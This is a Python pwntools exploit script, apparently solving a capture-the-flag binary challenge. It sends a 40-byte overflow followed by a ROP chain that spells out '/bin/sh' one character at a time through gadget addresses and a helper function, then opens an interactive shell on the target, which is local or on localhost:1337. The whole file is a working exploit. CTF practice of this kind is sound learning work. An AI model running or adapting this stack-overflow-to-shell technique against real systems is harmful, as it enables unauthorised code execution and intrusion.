from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process(e.path)

p = start()

rdi = 0x000000000040115a
ret = 0x000000000040101a
addChar = 0x40118e
rebuild = 0x40115f

slash = 0x4003b4
b = 0x402110 + 22
i = 0x402110 + 8
n = 0x402110 + 24
s = 0x402110 + 9
h = 0x402110 + 1


payload = b'a'*40 + flat(
        rdi, slash, addChar, rdi, b, addChar, rdi, i, addChar, rdi, n, addChar, rdi, slash, addChar, rdi, s, addChar, rdi, h, addChar, rebuild
)
p.sendline(payload)

p.interactive()
